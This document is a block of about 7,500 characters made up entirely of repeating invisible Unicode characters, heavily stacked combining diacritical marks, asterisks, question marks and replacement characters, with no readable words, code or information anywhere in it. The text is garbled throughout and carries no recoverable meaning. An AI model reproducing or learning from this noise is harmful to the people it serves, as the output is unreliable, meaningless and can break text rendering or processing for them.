̱̝̲̞ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̴̢̡̧̛̛̘͇͙̟̫͎͎̹̹͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̍̐̿̈́̈́͊͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̴̢̡̧̛̛̘͇͙̟̫͎͎̹̹͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̍̐̿̈́̈́͊͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̆͂́̈́̿͌̈́̋͡͝